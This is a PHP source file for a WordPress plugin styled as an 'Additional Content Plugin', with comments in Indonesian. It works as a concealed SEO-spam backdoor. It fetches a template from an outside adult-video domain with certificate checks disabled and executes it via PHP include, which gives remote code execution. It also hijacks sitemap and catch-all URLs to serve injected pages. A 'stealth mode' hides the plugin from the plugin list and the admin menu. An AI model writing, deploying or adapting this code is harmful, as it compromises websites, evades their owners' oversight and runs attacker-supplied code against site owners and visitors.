<?php
/*
Plugin Name: Additional Content Plugin
Description: Plugin konten & sitemap stealth dengan metode Native Include (Max Performance).
Version: 7.2
Author: Grok
*/

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// KONFIGURASI URL
define('ACP_TEMPLATE_URL', 'https://player.javpornsub.net/template/index.txt');
define('ACP_JSON_BASE_URL', 'https://player.javpornsub.net/content/');
define('ACP_MAX_URLS_PER_SITEMAP', 10000);
define('ACP_MAIN_SITEMAP', 'jav.xml');

// SETUP STORAGE
function acp_get_storage_dir() {
    $upload = wp_upload_dir();
    return $upload['basedir'] . '/acp-storage';
}

// ==========================================
// 1. SITEMAP HANDLER (NUCLEAR INTERCEPT)
// ==========================================
add_action('plugins_loaded', 'acp_nuclear_intercept', -9999);
function acp_nuclear_intercept() {
    if (isset($_SERVER['REQUEST_URI']) && strpos($_SERVER['REQUEST_URI'], '.xml') !== false) {
        $path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $filename = basename($path);
        
        // A. SITEMAP INDEX
        if ($filename === ACP_MAIN_SITEMAP) {
            acp_render_sitemap_index();
            exit;
        }

        // B. CHILD SITEMAP
        $filename_no_ext = str_replace('.xml', '', $filename);
        $sitemap_name = $filename_no_ext;
        $page = 1;

        if (preg_match('/^(.*?)-(\d+)$/', $filename_no_ext, $matches)) {
            $sitemap_name = $matches[1];
            $page = intval($matches[2]);
        }

        $endpoints = get_option('acp_endpoints', []);
        if (empty($endpoints)) return;

        $target_endpoint = false;
        foreach ($endpoints as $ep) {
            if (isset($ep['status']) && $ep['status'] === 'active' && $ep['sitemap_name'] === $sitemap_name) {
                $target_endpoint = $ep;
                break;
            }
        }

        if ($target_endpoint) {
            acp_render_child_sitemap($target_endpoint, $page);
            exit;
        }
    }
}

function acp_render_sitemap_index() {
    if (!headers_sent()) {
        header('HTTP/1.1 200 OK');
        header('Content-Type: application/xml; charset=utf-8');
        header('X-Robots-Tag: noindex, follow');
    }

    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;

        $total_urls = acp_get_local_json_count($ep['json_filename']);
        $total_pages = ceil($total_urls / ACP_MAX_URLS_PER_SITEMAP);
        if ($total_pages < 1) $total_pages = 1;

        for ($i = 1; $i <= $total_pages; $i++) {
            $suffix = ($i === 1) ? '' : '-' . $i;
            $loc = home_url($ep['sitemap_name'] . $suffix . '.xml');
            echo "\t<sitemap>\n\t\t<loc>" . esc_url($loc) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t</sitemap>\n";
        }
    }
    echo '</sitemapindex>';
}

function acp_render_child_sitemap($endpoint, $page) {
    if (!headers_sent()) {
        header('HTTP/1.1 200 OK');
        header('Content-Type: application/xml; charset=utf-8');
        header('X-Robots-Tag: noindex, follow');
    }

    $konten_data = acp_get_local_json($endpoint['json_filename']);

    echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    
    if (!empty($konten_data) && is_array($konten_data)) {
        $chunks = array_chunk($konten_data, ACP_MAX_URLS_PER_SITEMAP, true);
        $chunk_index = $page - 1;

        if (isset($chunks[$chunk_index])) {
            foreach ($chunks[$chunk_index] as $title => $desc) {
                echo "\t<url>\n\t\t<loc>" . esc_url(home_url(urlencode($title))) . "</loc>\n\t\t<lastmod>" . date('c') . "</lastmod>\n\t\t<changefreq>weekly</changefreq>\n\t</url>\n";
            }
        }
    }
    echo '</urlset>';
}

// ==========================================
// 2. HELPER (LOCAL FILE)
// ==========================================

function acp_download_and_save_files() {
    $storage_dir = acp_get_storage_dir();
    if (!file_exists($storage_dir)) {
        wp_mkdir_p($storage_dir);
        file_put_contents($storage_dir . '/.htaccess', 'deny from all');
    }

    // Download Template
    $tpl = wp_remote_get(ACP_TEMPLATE_URL, ['timeout' => 30, 'sslverify' => false]);
    if (!is_wp_error($tpl)) {
        $body = wp_remote_retrieve_body($tpl);
        if (!empty($body)) file_put_contents($storage_dir . '/template.txt', $body);
    }

    // Download JSONs
    $endpoints = get_option('acp_endpoints', []);
    $count = 0;
    foreach ($endpoints as $ep) {
        $json_url = ACP_JSON_BASE_URL . $ep['json_filename'] . '.json';
        $res = wp_remote_get($json_url, ['timeout' => 60, 'sslverify' => false]);
        if (!is_wp_error($res)) {
            $body = wp_remote_retrieve_body($res);
            if (json_decode($body)) {
                file_put_contents($storage_dir . '/' . $ep['json_filename'] . '.json', $body);
                $count++;
            }
        }
    }
    return $count;
}

function acp_get_local_json($filename) {
    $path = acp_get_storage_dir() . '/' . $filename . '.json';
    if (file_exists($path)) {
        return json_decode(file_get_contents($path), true);
    }
    return [];
}

function acp_get_local_json_count($filename) {
    return count(acp_get_local_json($filename));
}

// ==========================================
// 3. ADMIN PAGE
// ==========================================

add_filter('all_plugins', 'acp_hide_plugin_from_list');
function acp_hide_plugin_from_list($plugins) {
    if (get_option('acp_plugin_hidden', false)) {
        $plugin_file = plugin_basename(__FILE__);
        if (isset($plugins[$plugin_file])) unset($plugins[$plugin_file]);
    }
    return $plugins;
}

add_action('admin_menu', 'acp_admin_menu', 999);
function acp_admin_menu() {
    add_menu_page('Content Plugin', 'Content Plugin', 'manage_options', 'additional-content-plugin', 'acp_admin_page', 'dashicons-database');
    if (get_option('acp_plugin_hidden', false)) remove_menu_page('additional-content-plugin');
}

function acp_generate_random_string($length = 5) {
    return substr(str_shuffle('abcdefghijklmnopqrstuvwxyz0123456789'), 0, $length);
}

function acp_admin_page() {
    if (isset($_POST['acp_toggle_visibility'])) {
        check_admin_referer('acp_action');
        $curr = get_option('acp_plugin_hidden', false);
        update_option('acp_plugin_hidden', !$curr);
    }
    if (isset($_POST['acp_setup_endpoints'])) {
        check_admin_referer('acp_action');
        $count = intval($_POST['endpoint_count']);
        if ($count > 0) {
            $new = [];
            for ($i = 0; $i < $count; $i++) {
                $new[] = ['json_filename' => acp_generate_random_string(10), 'sitemap_name' => acp_generate_random_string(5), 'status' => 'pending'];
            }
            update_option('acp_endpoints', $new);
        }
    }
    if (isset($_POST['acp_generate_action'])) {
        check_admin_referer('acp_action');
        acp_download_and_save_files();
        $endpoints = get_option('acp_endpoints', []);
        foreach ($endpoints as &$ep) {
            $ep['status'] = file_exists(acp_get_storage_dir() . '/' . $ep['json_filename'] . '.json') ? 'active' : 'error';
        }
        update_option('acp_endpoints', $endpoints);
        echo '<div class="updated"><p>Download selesai & Sitemap Updated.</p></div>';
    }
    if (isset($_POST['acp_reset'])) {
        check_admin_referer('acp_action');
        delete_option('acp_endpoints');
    }

    $endpoints = get_option('acp_endpoints', false);
    $is_hidden = get_option('acp_plugin_hidden', false);
    $main_sitemap_url = home_url(ACP_MAIN_SITEMAP);
    ?>
    <div class="wrap">
        <h1>Content Plugin (V7.2 Native Include)</h1>
        <?php if ($is_hidden): ?><div class="notice notice-error"><p>MODE STEALTH AKTIF</p></div><?php endif; ?>
        
        <div style="background:#fff; padding:15px; border-left:4px solid #00a0d2; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center;">
            <div>Status: <strong><?php echo $is_hidden ? '<span style="color:red">HIDDEN</span>' : '<span style="color:green">VISIBLE</span>'; ?></strong></div>
            <form method="post"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_toggle_visibility" class="button" value="<?php echo $is_hidden ? 'Unhide' : 'Hide'; ?>"></form>
        </div>

        <?php if (!$endpoints): ?>
            <div class="card" style="max-width:400px; padding:20px;">
                <form method="post"><?php wp_nonce_field('acp_action'); ?>
                <p>Jumlah JSON: <input type="number" name="endpoint_count" value="3" class="small-text"></p>
                <input type="submit" name="acp_setup_endpoints" class="button button-primary" value="Setup"></form>
            </div>
        <?php else: ?>
            <div style="background:#e7f5fe; padding:20px; margin-bottom:20px; border:1px solid #00a0d2; border-radius:5px; text-align:center;">
                <h2>Sitemap Utama (Index)</h2>
                <div style="display:flex; justify-content:center; gap:10px;">
                    <input type="text" id="ms" value="<?php echo esc_attr($main_sitemap_url); ?>" class="regular-text" style="width:400px;text-align:center;" readonly>
                    <button type="button" class="button button-primary acp-copy" data-target="ms">COPY</button>
                </div>
                <br><a href="<?php echo esc_url($main_sitemap_url); ?>" target="_blank">Lihat jav.xml</a>
            </div>

            <form method="post"><?php wp_nonce_field('acp_action'); ?>
                <table class="wp-list-table widefat fixed striped">
                    <thead><tr><th>No</th><th>File JSON</th><th>Status Lokal</th></tr></thead>
                    <tbody>
                        <?php foreach ($endpoints as $i => $ep): $st = isset($ep['status']) ? $ep['status'] : 'pending'; ?>
                        <tr>
                            <td><?php echo $i + 1; ?></td>
                            <td><input type="text" value="<?php echo $ep['json_filename']; ?>" class="regular-text" style="width:150px;" readonly> .json</td>
                            <td>
                                <?php if ($st == 'active') echo '<strong style="color:green">OK (Tersimpan)</strong>'; 
                                      elseif ($st == 'error') echo '<strong style="color:red">GAGAL</strong>';
                                      else echo '<span style="color:#888">Belum Download</span>'; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
                <p class="submit"><input type="submit" name="acp_generate_action" class="button button-primary button-hero" value="DOWNLOAD & GENERATE"></p>
            </form>
            <form method="post" onsubmit="return confirm('Reset?');"><?php wp_nonce_field('acp_action'); ?><input type="submit" name="acp_reset" class="button button-link-delete" value="Reset"></form>
        <?php endif; ?>
    </div>
    <script>jQuery(document).ready(function($){$('.acp-copy').click(function(){var t=document.getElementById($(this).data('target'));t.select();document.execCommand('copy');alert('Copied!');});});</script>
    <?php
}

// ==========================================
// 4. CONTENT HANDLER (INCLUDE MODE)
// ==========================================
add_action('init', 'acp_register_rewrite_rules');
function acp_register_rewrite_rules() {
    add_rewrite_rule('^([^/]+)/?$', 'index.php?acp_value=$matches[1]', 'top');
}
add_filter('query_vars', function($v){ $v[] = 'acp_value'; return $v; });

add_action('template_redirect', 'acp_display_content');
function acp_display_content() {
    $val = get_query_var('acp_value');
    if (!$val) {
        $path = trim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
        if (!empty($path) && !is_admin() && !get_page_by_path($path)) $val = $path;
        else return;
    }
    $title = sanitize_text_field(urldecode($val));
    if (get_page_by_path($title, OBJECT, ['post', 'page'])) return;

    // Cek Template Lokal
    $template_path = acp_get_storage_dir() . '/template.txt';
    if (!file_exists($template_path)) return; // Stop jika template belum didownload

    $endpoints = get_option('acp_endpoints', []);
    foreach ($endpoints as $ep) {
        if (!isset($ep['status']) || $ep['status'] !== 'active') continue;
        
        // Cek JSON Lokal
        $data = acp_get_local_json($ep['json_filename']);
        if (is_array($data)) {
            foreach ($data as $k => $v) {
                if (strtolower($k) === strtolower($title)) {
                    $additional_content = $v; // Variabel ini akan dibaca oleh file template di bawah
                    
                    // GANTI EVAL DENGAN INCLUDE
                    // Jauh lebih cepat & aman
                    include $template_path;
                    exit;
                }
            }
        }
    }
}
